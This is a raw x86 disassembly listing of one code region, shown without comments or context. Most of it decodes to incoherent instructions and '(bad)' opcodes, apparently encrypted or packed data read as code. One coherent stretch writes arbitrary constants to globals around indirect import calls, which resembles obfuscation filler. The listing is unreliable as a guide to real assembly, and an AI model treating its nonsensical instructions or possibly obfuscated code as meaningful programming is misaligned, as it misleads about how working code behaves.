  41c098:	mov    esi,0xc066747e
  41c09d:	imul   eax,edi,0xffffff80
  41c0a0:	or     ebx,ebp
  41c0a2:	sahf   
  41c0a3:	cmp    bh,ah
  41c0a5:	mov    BYTE PTR [ebx+0x34840bfc],ch
  41c0ab:	push   ebx
  41c0ac:	dec    esp
  41c0ad:	popf   
  41c0ae:	repz add eax,0x62673bc9
  41c0b4:	and    DWORD PTR [eax-0x25],edi
  41c0b7:	add    edx,DWORD PTR [edi]
  41c0b9:	push   es
  41c0ba:	jle    0x41c03f
  41c0bc:	aam    0x6e
  41c0be:	or     al,0x21
  41c0c0:	mov    ch,0x5d
  41c0c2:	popa   
  41c0c3:	mov    ?,WORD PTR [esi+0x24491398]
  41c0c9:	mov    ebx,0xb6a993da
  41c0ce:	and    dl,BYTE PTR ds:0xb6f4262e
  41c0d4:	retf   
  41c0d5:	aad    0xa1
  41c0d7:	fcomp  QWORD PTR [eax]
  41c0d9:	inc    ecx
  41c0da:	pop    esp
  41c0db:	dec    eax
  41c0dc:	fsubr  QWORD PTR [ebx+0x12c29303]
  41c0e2:	sbb    DWORD PTR [edx-0x13],0x52
  41c0e6:	jmp    0x1a8e:0x308426bd
  41c0ed:	push   0x16
  41c0ef:	and    DWORD PTR [eax+0x77030bc2],eax
  41c0f5:	outs   dx,BYTE PTR ds:[esi]
  41c0f6:	lods   al,BYTE PTR ds:[esi]
  41c0f7:	inc    esi
  41c0f8:	jmp    0x41c16b
  41c0fa:	lods   al,BYTE PTR ds:[esi]
  41c0fb:	jns    0x41c09a
  41c0fd:	das    
  41c0fe:	bound  edx,QWORD PTR [ebp-0x18]
  41c101:	aad    0x43
  41c103:	adc    DWORD PTR [ecx],esi
  41c105:	sahf   
  41c106:	and    al,0x8d
  41c108:	or     esp,esi
  41c10a:	inc    ebx
  41c10b:	scas   al,BYTE PTR es:[edi]
  41c10c:	pop    ds
  41c10d:	int3   
  41c10e:	cmc    
  41c10f:	ins    DWORD PTR es:[edi],dx
  41c110:	push   ebp
  41c111:	pop    es
  41c112:	jmp    0x41c0c4
  41c114:	pop    esp
  41c115:	dec    eax
  41c116:	inc    eax
  41c117:	(bad)  
  41c118:	push   ebx
  41c119:	inc    esp
  41c11a:	out    dx,eax
  41c11b:	(bad)  
  41c11c:	adc    al,0xdc
  41c11e:	mov    WORD PTR [esi-0x16f308ed],ss
  41c124:	lahf   
  41c125:	lods   al,BYTE PTR ds:[esi]
  41c126:	popf   
  41c127:	adc    edx,DWORD PTR [eax]
  41c129:	sub    ebx,DWORD PTR [esi+ebp*8-0xf]
  41c12d:	hlt    
  41c12e:	mov    ebp,edx
  41c130:	ins    DWORD PTR es:[edi],dx
  41c131:	dec    eax
  41c132:	mov    esp,0x8901388
  41c137:	dec    ebx
  41c138:	sti    
  41c139:	fcmovnu st,st(7)
  41c13b:	(bad)  
  41c13c:	push   ecx
  41c13d:	ins    DWORD PTR es:[edi],dx
  41c13e:	mov    WORD PTR [edx+0x5a],?
  41c141:	or     eax,0x66f57bf8
  41c146:	repz mov bh,BYTE PTR [eax+0x3b]
  41c14a:	xor    BYTE PTR [edi+0x4467605a],bl
  41c150:	sub    esi,DWORD PTR [edi*4-0x2c9baf6f]
  41c157:	dec    ebp
  41c158:	jb     0x41c1bb
  41c15a:	retf   
  41c15b:	mov    bh,0xd
  41c15d:	test   DWORD PTR [edi+0x61585ab1],0x1cfa616b
  41c167:	inc    ecx
  41c168:	std    
  41c169:	ja     0x41c17a
  41c16b:	cmp    DWORD PTR [edi+0x7e],0x3232fdea
  41c172:	dec    eax
  41c173:	hlt    
  41c174:	mov    dh,0x83
  41c176:	inc    edx
  41c177:	lahf   
  41c178:	test   al,0x14
  41c17a:	dec    eax
  41c17b:	cwde   
  41c17c:	inc    eax
  41c17d:	sub    BYTE PTR [edx+edi*8],al
  41c180:	cmc    
  41c181:	push   ds
  41c182:	xchg   ebp,eax
  41c183:	pop    ebx
  41c184:	xchg   esp,eax
  41c185:	dec    edi
  41c186:	call   0xfa2d:0x8fc17aad
  41c18d:	sbb    dh,BYTE PTR [esp+ebp*1]
  41c190:	jnp    0x41c168
  41c192:	cs popf 
  41c194:	or     bh,al
  41c196:	int3   
  41c197:	push   ds
  41c198:	push   edi
  41c199:	push   0xfffffff1
  41c19b:	cmp    al,0xd0
  41c19d:	ins    BYTE PTR es:[edi],dx
  41c19e:	ret    0x9fd2
  41c1a1:	into   
  41c1a2:	cs addr16 xchg esi,eax
  41c1a5:	and    esp,DWORD PTR [edx]
  41c1a7:	(bad)  
  41c1a8:	loopne 0x41c160
  41c1aa:	retf   
  41c1ab:	aad    0x2
  41c1ad:	std    
  41c1ae:	retf   0x5d7c
  41c1b1:	push   esi
  41c1b2:	and    BYTE PTR [esi+0x166a5a7],ah
  41c1b8:	and    BYTE PTR [ebx],dh
  41c1ba:	or     eax,0x66cf739f
  41c1bf:	lods   al,BYTE PTR ds:[esi]
  41c1c0:	xchg   ecx,eax
  41c1c1:	out    dx,al
  41c1c2:	jle    0x41c17c
  41c1c4:	jmp    0x7ad04cbd
  41c1c9:	fiadd  WORD PTR [edi+0x6d4adeb1]
  41c1cf:	cli    
  41c1d0:	cmp    bl,cl
  41c1d2:	inc    eax
  41c1d3:	and    eax,0x91143b03
  41c1d8:	cmp    DWORD PTR [edi-0x3d],edi
  41c1db:	retf   0xb8f0
  41c1de:	mov    esi,0x24ca4997
  41c1e3:	add    ebp,ebp
  41c1e5:	xor    BYTE PTR [ebx+0x11],bl
  41c1e8:	push   es
  41c1e9:	mov    WORD PTR [edx-0x54a41193],?
  41c1ef:	and    ch,ch
  41c1f1:	add    esi,DWORD PTR [edx+0x78]
  41c1f4:	enter  0x7e0c,0x40
  41c1f8:	jmp    0x41c26b
  41c1fa:	xor    ebp,DWORD PTR [ebp-0x589a8d2]
  41c200:	mov    ch,0xbc
  41c202:	push   edi
  41c203:	sbb    bh,dh
  41c205:	pop    esi
  41c206:	mov    ebp,0x6dc47db1
  41c20b:	push   es
  41c20c:	loopne 0x41c257
  41c20e:	fimul  DWORD PTR [edx]
  41c210:	jg     0x41c1cf
  41c212:	call   0x43ea:0x4b2a44d3
  41c219:	frstor [esi+0x6dcdef5]
  41c21f:	ins    DWORD PTR es:[edi],dx
  41c220:	or     DWORD PTR [edx+0x44],0x8e1486e3
  41c227:	sbb    DWORD PTR [ebx+0x5ecb7229],0x4f
  41c22e:	(bad)  [edi+ebx*1]
  41c231:	in     eax,dx
  41c232:	jl     0x41c275
  41c234:	stos   DWORD PTR es:[edi],eax
  41c235:	pop    es
  41c236:	push   esp
  41c237:	xor    edi,esi
  41c239:	inc    esi
  41c23a:	add    ebx,DWORD PTR [edi-0x1b]
  41c23d:	sub    eax,0x4ec72961
  41c242:	xchg   esp,eax
  41c243:	jbe    0x41c1c5
  41c245:	aas    
  41c246:	jg     0x41c1e4
  41c248:	into   
  41c249:	mov    esp,0xa0000ab4
  41c24e:	out    dx,eax
  41c24f:	add    ebp,0xcc04d868
  41c255:	cmp    eax,DWORD PTR [esi-0x29739ac8]
  41c25b:	mov    ah,0xf5
  41c25d:	(bad)  
  41c25e:	call   0xd472f34b
  41c263:	js     0x41c293
  41c265:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c266:	fldenv [ecx-0x14]
  41c269:	mov    eax,edi
  41c26b:	xchg   ebp,eax
  41c26c:	xor    al,0xdc
  41c26e:	icebp  
  41c26f:	inc    ecx
  41c270:	imul   ecx,DWORD PTR [edx+0x7972a1a2],0xb90e02bd
  41c27a:	pop    esp
  41c27b:	inc    ebx
  41c27c:	adc    eax,0x3e2dae0
  41c281:	mov    es,edi
  41c283:	loopne 0x41c28a
  41c285:	push   ds
  41c286:	mov    gs,WORD PTR [esi]
  41c288:	daa    
  41c289:	pushf  
  41c28a:	sub    eax,0x5a84314b
  41c28f:	push   ebx
  41c290:	iret   
  41c291:	and    al,0xf1
  41c293:	fdivr  DWORD PTR [ecx-0x465fb2ea]
  41c299:	inc    esi
  41c29a:	(bad)
  41c29d:	pushf  
  41c29e:	mov    ch,0xc0
  41c2a0:	mul    BYTE PTR [ecx-0x5d]
  41c2a3:	daa    
  41c2a4:	loope  0x41c2d7
  41c2a6:	mov    dh,0xb9
  41c2a8:	test   DWORD PTR [esi-0x4f],edi
  41c2ab:	adc    eax,0x84a68e56
  41c2b0:	pop    ebp
  41c2b1:	add    DWORD PTR [ebp+0x1d],edi
  41c2b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2b5:	add    eax,0xdc7492fb
  41c2ba:	mov    ebx,0x1735903f
  41c2bf:	dec    edi
  41c2c0:	push   0xd8a4b183
  41c2c5:	push   ss
  41c2c6:	cmp    DWORD PTR ds:0x82275146,edx
  41c2cc:	call   0x6939:0xe82fc11a
  41c2d3:	and    al,ah
  41c2d5:	and    DWORD PTR [esi-0x3f],eax
  41c2d8:	xchg   esp,eax
  41c2d9:	mov    WORD PTR [esi+0x16],?
  41c2dc:	xor    eax,0xf80bfa23
  41c2e1:	xchg   esi,eax
  41c2e2:	and    BYTE PTR [ebp-0x3],cl
  41c2e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2e6:	dec    esi
  41c2e7:	fwait
  41c2e8:	push   ebp
  41c2e9:	mov    edi,0x83ca4791
  41c2ee:	jl     0x41c2c4
  41c2f0:	scas   eax,DWORD PTR es:[edi]
  41c2f1:	xor    dl,ah
  41c2f3:	or     edi,DWORD PTR [edi-0x65236635]
  41c2f9:	es sti 
  41c2fb:	add    cl,bl
  41c2fd:	loopne 0x41c309
  41c2ff:	ins    BYTE PTR es:[edi],dx
  41c300:	xor    al,0x60
  41c302:	cdq    
  41c303:	inc    ebx
  41c304:	jge    0x41c2c4
  41c306:	cmp    BYTE PTR [ebp+0x28],0xb0
  41c30a:	in     al,dx
  41c30b:	dec    esi
  41c30c:	popf   
  41c30d:	pop    ss
  41c30e:	mov    bh,0x5c
  41c310:	pushaw 
  41c312:	or     esp,DWORD PTR [ecx]
  41c314:	mov    edx,0x8bed5748
  41c319:	or     ebx,esi
  41c31b:	xor    eax,0x5e8c
  41c320:	mov    DWORD PTR [ebp-0x48],eax
  41c323:	sbb    DWORD PTR ds:0x4284e5,edi
  41c329:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41c333:	mov    DWORD PTR [ebp-0x138],0x1169
  41c33d:	mov    DWORD PTR [ebp-0x12c],0x1379
  41c347:	sbb    DWORD PTR ds:0x428555,ecx
  41c34d:	mov    eax,DWORD PTR [ebp-0x12c]
  41c353:	adc    DWORD PTR ds:0x4284c9,0x44e5
  41c35d:	mov    ecx,0x5856
  41c362:	sub    ecx,eax
  41c364:	and    DWORD PTR ds:0x428425,ecx
  41c36a:	shr    ecx,0x2
  41c36d:	cmp    DWORD PTR ds:0x42856d,0x0
  41c374:	mov    DWORD PTR ds:0x428419,0x1c8e
  41c37e:	mov    DWORD PTR ds:0x4284f9,0x3a72
  41c388:	mov    DWORD PTR ds:0x42833d,0x2994
  41c392:	jmp    0x41c475
  41c397:	mov    eax,ds:0x4284dd
  41c39c:	cmp    DWORD PTR ds:0x42856d,0x0
  41c3a3:	jge    0x41c3d2
  41c3a9:	push   DWORD PTR [ebp-0x20]
  41c3ac:	push   DWORD PTR [ebp-0x24]
  41c3af:	push   DWORD PTR [ebp-0x1c]
  41c3b2:	call   DWORD PTR ds:0x42e120
  41c3b8:	and    DWORD PTR ds:0x428409,edx
  41c3be:	sub    DWORD PTR ds:0x428369,0x53c2
  41c3c8:	and    DWORD PTR ds:0x42836d,0x428579
  41c3d2:	or     DWORD PTR ds:0x428549,edi
  41c3d8:	sbb    DWORD PTR ds:0x428365,0x428555
  41c3e2:	cmp    DWORD PTR ds:0x428471,0x0
  41c3e9:	mov    DWORD PTR ds:0x428441,0x3b49
  41c3f3:	mov    DWORD PTR ds:0x428451,0x7933
  41c3fd:	mov    DWORD PTR ds:0x428465,0x897
  41c407:	mov    DWORD PTR ds:0x428359,0x5a92
  41c411:	jmp    0x41c475
  41c416:	mov    eax,0x55e0
  41c41b:	movzx  eax,WORD PTR ds:0x4284cd
  41c422:	cmp    DWORD PTR ds:0x428471,0x0
  41c429:	ja     0x41c45f
  41c42f:	push   DWORD PTR [ebp-0x18]
  41c432:	push   DWORD PTR [ebp-0x18]
  41c435:	push   DWORD PTR [ebp-0x18]
  41c438:	push   DWORD PTR [ebp-0x20]
  41c43b:	push   0x8c53
  41c440:	push   DWORD PTR [ebp-0x14]
  41c443:	call   DWORD PTR ds:0x42e068
  41c449:	add    DWORD PTR ds:0x428405,ecx
  41c44f:	not    DWORD PTR ds:0x4284d9
  41c455:	adc    DWORD PTR ds:0x428449,0x2c56
  41c45f:	add    DWORD PTR ds:0x4284f5,0x42842d
  41c469:	add    DWORD PTR ds:0x42840d,edi
  41c46f:	sub    DWORD PTR ds:0x42847d,edx
  41c475:	sub    ecx,0x5be6
  41c47b:	mov    eax,DWORD PTR [ebp-0x138]
  41c481:	xor    DWORD PTR ds:0x428435,0x2de
  41c48b:	imul   ecx,eax
  41c48e:	mov    eax,ds:0x428465
  41c493:	add    DWORD PTR ds:0x42857d,eax
  41c499:	mov    eax,DWORD PTR [ebp-0x13c]
  41c49f:	and    ecx,eax
  41c4a1:	cmp    DWORD PTR ds:0x428579,0x0
  41c4a8:	mov    DWORD PTR ds:0x42845d,0x420b
  41c4b2:	mov    DWORD PTR ds:0x4284d9,0x3ab4
  41c4bc:	mov    DWORD PTR ds:0x428479,0x3618
  41c4c6:	jmp    0x41c90c
  41c4cb:	mov    DWORD PTR ds:0x428419,0xf37
  41c4d5:	not    eax
  41c4d7:	cmp    DWORD PTR ds:0x428579,0x0
  41c4de:	jg     0x41c505
  41c4e4:	push   0x2612
  41c4e9:	push   DWORD PTR [ebp-0x1c]
  41c4ec:	push   DWORD PTR [ebp-0x14]
  41c4ef:	call   DWORD PTR ds:0x42e06c
  41c4f5:	and    DWORD PTR ds:0x428459,0x4284e9
  41c4ff:	add    DWORD PTR ds:0x42834d,edi
  41c505:	xor    DWORD PTR ds:0x42841d,edx
  41c50b:	sbb    DWORD PTR ds:0x428465,0x428455
  41c515:	mov    DWORD PTR ds:0x428479,0x491d
  41c51f:	add    DWORD PTR ds:0x428351,ebx
  41c525:	jmp    0x41c90c
  41c52a:	sub    ch,BYTE PTR [esi-0x62]
  41c52d:	sbb    DWORD PTR [edx-0x7c9145e7],edi
  41c533:	pop    ebp
  41c534:	and    al,0x9e
  41c536:	(bad)  
  41c537:	sbb    eax,0x41609206
  41c53c:	sar    BYTE PTR [esi-0x41413bb6],0x17
  41c543:	ja     0x41c52e
  41c545:	fcomp  QWORD PTR [ecx+0x18]
  41c548:	mov    DWORD PTR [esi+0x2b69176f],0x718225f1
  41c552:	push   edx
  41c553:	add    al,0xfc
  41c555:	jp     0x41c56b
  41c557:	fs test esp,edx
  41c55a:	or     ebx,esp
  41c55c:	mov    eax,0xd864351d
  41c561:	enter  0x969d,0x5c
  41c565:	sub    eax,0xa232adfc
  41c56a:	in     eax,0x3b
  41c56c:	jae    0x41c513
  41c56e:	xor    BYTE PTR [edx],0xf
  41c571:	je     0x41c5e7
  41c573:	sbb    ecx,DWORD PTR [ecx+0x36]
  41c576:	xchg   edx,eax
  41c577:	das    
  41c578:	repz rcl DWORD PTR [ecx+eax*8],1
  41c57c:	paddusb mm1,QWORD PTR [ecx-0x13]
  41c580:	jns    0x41c537
  41c582:	pop    esi
  41c583:	neg    BYTE PTR [edx]
  41c585:	ins    DWORD PTR es:[edi],dx
  41c586:	not    DWORD PTR [eax+0x175ba869]
  41c58c:	fdivp  st(3),st
  41c58e:	rcl    ch,1
  41c590:	js     0x41c5f3
  41c592:	xor    bh,0xe5
  41c595:	enter  0x53ca,0x51
  41c599:	loope  0x41c584
  41c59b:	out    0x22,eax
  41c59d:	xchg   edi,eax
  41c59e:	lea    ecx,[edx]
  41c5a0:	fwait
  41c5a1:	pop    ds
  41c5a2:	(bad)  
  41c5a3:	in     al,0xb0
  41c5a5:	sbb    al,0xc8
  41c5a7:	push   esi
  41c5a8:	pusha  
  41c5a9:	jle    0x41c589
  41c5ab:	idiv   DWORD PTR [ebx-0x3225f335]
  41c5b1:	wbinvd 
  41c5b3:	xor    DWORD PTR [ebx+0x1a],ebp
  41c5b6:	lods   eax,DWORD PTR ds:[esi]
  41c5b7:	jns    0x41c60a
  41c5b9:	push   ebx
  41c5ba:	sbb    ch,BYTE PTR ds:0xf4f1cb12
  41c5c0:	ins    BYTE PTR es:[edi],dx
  41c5c1:	iret   
  41c5c2:	jne    0x41c5f9
  41c5c4:	leave  
  41c5c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5c6:	push   edi
  41c5c7:	or     ch,0x25
  41c5ca:	sub    ch,BYTE PTR [eax-0x9]
  41c5cd:	fidivr WORD PTR [ecx-0x1bb8a3c]
  41c5d3:	jb     0x41c5f2
  41c5d5:	push   ds
  41c5d6:	rcl    DWORD PTR [eax+0x3a],cl
  41c5d9:	adc    eax,0xe8534fe0
  41c5de:	add    BYTE PTR [eax-0x44],al
  41c5e1:	push   edi
  41c5e2:	xlat   BYTE PTR ds:[ebx]
  41c5e3:	push   ebx
  41c5e4:	inc    ecx
  41c5e5:	adc    eax,0x578a484b
  41c5ea:	in     eax,dx
  41c5eb:	mov    WORD PTR [edx],es
  41c5ed:	or     eax,0x245333c
  41c5f2:	hlt    
  41c5f3:	sbb    al,0xeb
  41c5f5:	(bad)  
  41c5f6:	outs   dx,DWORD PTR ds:[esi]
  41c5f7:	les    eax,FWORD PTR [esi+0x13]
  41c5fa:	std    
  41c5fb:	jle    0x41c621
  41c5fd:	jp     0x41c5da
  41c5ff:	push   esi
  41c600:	push   ebx
  41c601:	cmp    DWORD PTR [edi+0x3],esi
  41c604:	sub    al,ch
  41c606:	sti    
  41c607:	retf   
  41c608:	push   edi
  41c609:	stos   BYTE PTR es:[edi],al
  41c60a:	mov    dl,0x54
  41c60c:	xor    al,0x9f
  41c60e:	sub    edx,DWORD PTR [ecx-0x3b7c00ec]
  41c614:	test   bl,ah
  41c616:	jge    0x41c606
  41c618:	sets   BYTE PTR [ebx]
  41c61b:	aad    0xd9
  41c61d:	popa   
  41c61e:	xlat   BYTE PTR ds:[ebx]
  41c61f:	gs jno 0x41c665
  41c622:	xchg   BYTE PTR [edx],dh
  41c624:	or     BYTE PTR [eax-0x5864a97],dh
  41c62a:	push   ds
  41c62b:	inc    edx
  41c62c:	out    0x3c,al
  41c62e:	jno    0x41c5d0
  41c630:	mov    al,0x89
  41c632:	pop    ss
  41c633:	inc    edi
  41c634:	stos   DWORD PTR es:[edi],eax
  41c635:	cdq    
  41c636:	cmp    bh,bl
  41c638:	cmp    BYTE PTR [ecx-0x5d],0xcf
  41c63c:	xor    eax,0x3e30ca40
  41c641:	pop    esp
  41c642:	lahf   
  41c643:	xor    eax,0x97b0dc98
  41c648:	inc    edi
  41c649:	xlat   BYTE PTR ds:[ebx]
  41c64a:	mov    bl,0x46
  41c64c:	ds int3 
  41c64e:	icebp  
  41c64f:	hlt    
  41c650:	sub    ch,BYTE PTR [edi+0x3f366647]
  41c656:	ud0    esi,DWORD PTR es:[ecx]
  41c65a:	in     eax,0xe7
  41c65c:	dec    ebx
  41c65d:	mov    ah,0xbe
  41c65f:	rcl    BYTE PTR [eax+0x61c2e7e8],0x5e
  41c666:	outs   dx,DWORD PTR ds:[esi]
  41c667:	inc    esi
  41c668:	js     0x41c641
  41c66a:	ins    DWORD PTR es:[edi],dx
  41c66b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c66c:	sub    al,0xcb
  41c66e:	hlt    
  41c66f:	add    eax,0xf734351e
  41c674:	ffree  st(2)
  41c676:	lods   eax,DWORD PTR ds:[esi]
  41c677:	jge    0x41c68d
  41c679:	sbb    eax,edi
  41c67b:	mov    ?,WORD PTR [ecx]
  41c67d:	mov    si,0x73cd
  41c681:	sbb    DWORD PTR [ebx],0x1b37edb2
  41c687:	push   ss
  41c688:	iret   
  41c689:	xchg   edx,eax
  41c68a:	out    dx,al
  41c68b:	jb     0x41c684
  41c68d:	repz push es
  41c68f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c690:	adc    BYTE PTR cs:[edx],bh
  41c693:	call   0x8ab3:0x2b2db2e6
  41c69a:	mov    dl,0x81
  41c69c:	xchg   esp,eax
  41c69d:	dec    esp
  41c69e:	push   cs
  41c69f:	jp     0x41c69c
  41c6a1:	inc    ecx
  41c6a2:	inc    esi
  41c6a3:	xchg   edi,eax
  41c6a4:	pop    ax
  41c6a6:	cmp    cl,bh
  41c6a8:	xchg   ebx,eax
  41c6a9:	fwait
  41c6aa:	(bad)  
  41c6ab:	ins    DWORD PTR es:[edi],dx
  41c6ac:	push   ebx
  41c6ad:	call   0x4715:0x698dfd4a
  41c6b4:	mov    ds:0x29e3857a,al
  41c6b9:	and    cl,BYTE PTR [edx+0x22]
  41c6bc:	sti    
  41c6bd:	dec    esp
  41c6be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6bf:	pop    ebx
  41c6c0:	add    eax,0xed205c98
  41c6c5:	out    0x4d,eax
  41c6c7:	je     0x41c654
  41c6c9:	add    eax,0xedbf4f77
  41c6ce:	dec    edi
  41c6cf:	dec    esi
  41c6d0:	mov    esi,0xefe2c997
  41c6d5:	int    0xc4
  41c6d7:	ror    eax,0xcb
  41c6da:	data16 mov BYTE PTR [esi-0x59],ch
  41c6de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6df:	adc    eax,0xb906e25
  41c6e4:	jo     0x41c751
  41c6e6:	jmp    0x41c6a4
  41c6e8:	adc    BYTE PTR [ecx-0x783113dd],bl
  41c6ee:	jmp    DWORD PTR [ebx]
  41c6f0:	or     al,0xcb
  41c6f2:	pop    ebp
  41c6f3:	stos   BYTE PTR es:[edi],al
  41c6f4:	sbb    BYTE PTR [eax+0x2441321e],ah
  41c6fa:	jp     0x41c70b
  41c6fc:	adc    DWORD PTR [edi-0x3fb0b3f7],ebx
  41c702:	loopne 0x41c690
  41c704:	bound  eax,QWORD PTR [ecx-0x5b]
  41c707:	xchg   ecx,eax
  41c708:	mov    edi,0x656ee698
  41c70d:	mov    eax,0x7dafc634
  41c712:	mov    DWORD PTR [ebp+0x7c],ebp
  41c715:	ja     0x41c6d6
  41c717:	in     eax,dx
  41c718:	jo     0x41c743
  41c71a:	jge    0x41c6d1
  41c71c:	retf   0x2528
  41c71f:	into   
  41c720:	mov    dx,0x4acd
  41c724:	xchg   edx,eax
  41c725:	mov    esi,fs
  41c727:	jo     0x41c6e2
  41c729:	xchg   ecx,eax
  41c72a:	inc    ebx
  41c72b:	add    ebx,DWORD PTR [ebx-0x53]
  41c72e:	lods   eax,DWORD PTR ds:[esi]
  41c72f:	push   esp
  41c730:	fadd   QWORD PTR [ecx-0x62]
  41c733:	retf   
  41c734:	xchg   ebp,eax
  41c735:	cmp    BYTE PTR [edx+0x6f],al
  41c738:	sbb    BYTE PTR [eax-0x472f49ec],dh
  41c73e:	jmp    0xa810:0x7ab02b5e
  41c745:	xchg   edi,eax
  41c746:	inc    esi
  41c747:	xor    DWORD PTR [eax+ecx*8+0xa],ecx
  41c74b:	xchg   edi,eax
  41c74c:	int3   
  41c74d:	cmp    edi,DWORD PTR [ebx-0x766db2a8]
  41c753:	or     edi,eax
  41c755:	push   es
  41c756:	jmp    0x10e6b76c
  41c75b:	push   ds
  41c75c:	inc    ecx
  41c75d:	jb     0x41c70e
  41c75f:	arpl   si,bx
  41c761:	add    al,0xfd
  41c763:	into   
  41c764:	sub    eax,DWORD PTR [ebx+0x5030cf6d]
  41c76a:	ja     0x41c7b0
  41c76c:	lea    esp,[eax-0x5b]
  41c76f:	pop    ecx
  41c770:	lock mov WORD PTR [ebp+0x5a8992a],gs
  41c777:	data16 and cl,BYTE PTR [ebx]
  41c77a:	test   eax,0x368bdbd3
  41c77f:	dec    esi
  41c780:	sub    al,0xb3
  41c782:	cwde   
  41c783:	or     cl,0xf2
  41c786:	fstp   QWORD PTR [ebx]
  41c788:	test   DWORD PTR ds:0x757e7de0,0x2a162a5c
  41c792:	cs push ss
  41c794:	bound  edx,QWORD PTR [ebx+0x74]
  41c797:	aam    0xbc
  41c799:	add    al,0xc3
  41c79b:	xchg   esi,eax
  41c79c:	mov    eax,DWORD PTR [ebp+0x28522273]
  41c7a2:	push   ss
  41c7a3:	jno    0x41c75e
  41c7a5:	retf   0xf7b0
  41c7a8:	test   dl,al
  41c7aa:	pop    ebx
  41c7ab:	(bad)  
  41c7ac:	jbe    0x41c75c
  41c7ae:	xchg   edx,eax
  41c7af:	push   ss
  41c7b0:	xchg   ecx,eax
  41c7b1:	mov    bh,0x1a
  41c7b3:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41c7b5:	add    DWORD PTR [ebp+0x6d],edx
  41c7b8:	scas   eax,DWORD PTR es:[edi]
  41c7b9:	sub    al,0x97
  41c7bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7bc:	inc    BYTE PTR [esi+0x48]
  41c7bf:	sub    DWORD PTR [eax],ebp
  41c7c1:	outs   dx,DWORD PTR ds:[esi]
  41c7c2:	and    ebx,0x7bd55f17
  41c7c8:	dec    ebp
  41c7c9:	fisubr WORD PTR [ecx+0x73]
  41c7cc:	pop    eax
  41c7cd:	and    eax,0xe0a324c3
  41c7d2:	mov    gs,WORD PTR [ebx]
  41c7d4:	sub    dl,BYTE PTR [edx]
  41c7d6:	dec    ebp
  41c7d7:	or     eax,0xdc7c7dc4
  41c7dc:	mov    ds:0x83770528,al
  41c7e1:	push   ds
  41c7e2:	dec    edx
  41c7e3:	ins    BYTE PTR es:[edi],dx
  41c7e4:	mov    edx,0xbe0742ce
  41c7e9:	pop    esi
  41c7ea:	dec    edx
  41c7eb:	stos   DWORD PTR es:[edi],eax
  41c7ec:	imul   ecx,ebx,0x57
  41c7ef:	enter  0xeafb,0x2d
  41c7f3:	icebp  
  41c7f4:	jbe    0x41c847
  41c7f6:	neg    DWORD PTR [edi-0x4a]
  41c7f9:	fstp   TBYTE PTR [esi]
  41c7fb:	cld    
  41c7fc:	pop    es
  41c7fd:	cs mov eax,0xf021dde9
  41c803:	std    
  41c804:	xchg   ch,bh
  41c806:	retf   
  41c807:	jmp    0x79068036
  41c80c:	jb     0x41c810
  41c80e:	adc    esp,DWORD PTR [eax+0x71709b98]
  41c814:	jmp    0x8989b7ff
  41c819:	sbb    al,0xcc
  41c81b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c81c:	popa   
  41c81d:	mov    BYTE PTR [esi-0x68],ah
  41c820:	sub    ch,BYTE PTR [eax]
  41c822:	call   0x92fc283f
  41c827:	or     ebx,DWORD PTR [ebx-0x35]
  41c82a:	dec    edx
  41c82b:	(bad)  
  41c82c:	push   ebx
  41c82d:	xor    eax,0x82bca540
  41c832:	mov    cl,0x2a
  41c834:	sbb    BYTE PTR [ebp+ebp*4+0x75e1ca3d],al
  41c83b:	jo     0x41c7f2
  41c83d:	lock test al,0x1f
  41c840:	rol    DWORD PTR [esp+ebp*8+0x6717b2c1],cl
  41c847:	mov    BYTE PTR ds:0x4dc1a08d,ch
  41c84d:	daa    
  41c84e:	sub    al,0x8
  41c850:	pop    es
  41c851:	lods   al,BYTE PTR ds:[esi]
  41c852:	dec    esp
  41c853:	int3   
  41c854:	(bad)  
  41c855:	ficomp WORD PTR [ebx+0x20]
  41c858:	pop    esp
  41c859:	sub    eax,0x75c954f5
  41c85e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c85f:	add    DWORD PTR [ecx+0x7a32a783],ebx
  41c865:	mov    ?,edi
  41c867:	jo     0x41c84c
  41c869:	cmp    DWORD PTR [edx],esi
  41c86b:	aas    
  41c86c:	pop    edi
  41c86d:	xchg   esp,eax
  41c86e:	(bad)  
  41c86f:	xchg   ebx,eax
  41c870:	pop    edi
  41c871:	xchg   ecx,eax
  41c872:	out    dx,eax
  41c873:	mov    ah,0xd7
  41c875:	xlat   BYTE PTR ds:[ebx]
  41c876:	cmc    
  41c877:	inc    esi
  41c878:	mov    dl,0x77
  41c87a:	shr    DWORD PTR [ecx-0x55],0xc2
  41c87e:	xchg   ebp,eax
  41c87f:	pop    es
  41c880:	mov    ss,WORD PTR [esi+edx*4]
  41c883:	mov    dl,0xfc
  41c885:	sub    ecx,DWORD PTR [ebp-0x5d]
  41c888:	cld    
  41c889:	mov    edi,0x96e0f8a2
  41c88e:	jmp    0x767b814d
  41c893:	cwde   
  41c894:	mov    edx,0x5ba26981
  41c899:	dec    sp
  41c89b:	out    dx,al
  41c89c:	jno    0x41c842
  41c89e:	daa    
  41c89f:	jns    0x41c8f4
  41c8a1:	xchg   ebx,eax
  41c8a2:	in     al,dx
  41c8a3:	add    DWORD PTR [edx+0x6d],eax
  41c8a6:	lods   al,BYTE PTR ds:[esi]
  41c8a7:	clc    
  41c8a8:	fwait
  41c8a9:	stc    
  41c8aa:	mov    eax,0xa35f8e31
  41c8af:	rcr    BYTE PTR [ecx-0x3a],0x6c
  41c8b3:	imul   edx,ebp,0xffffffa8
  41c8b6:	pop    eax
  41c8b7:	dec    ebx
  41c8b8:	or     al,0x5c
  41c8ba:	sti    
  41c8bb:	jb     0x41c853
  41c8bd:	mov    eax,ds:0xec5d8b42
  41c8c2:	leave  
  41c8c3:	lock mov cl,0x7f
  41c8c6:	les    edx,FWORD PTR [edi]
  41c8c8:	jle    0x41c8ed
  41c8ca:	sti    
  41c8cb:	mov    eax,0xb2525c10
  41c8d0:	(bad)  
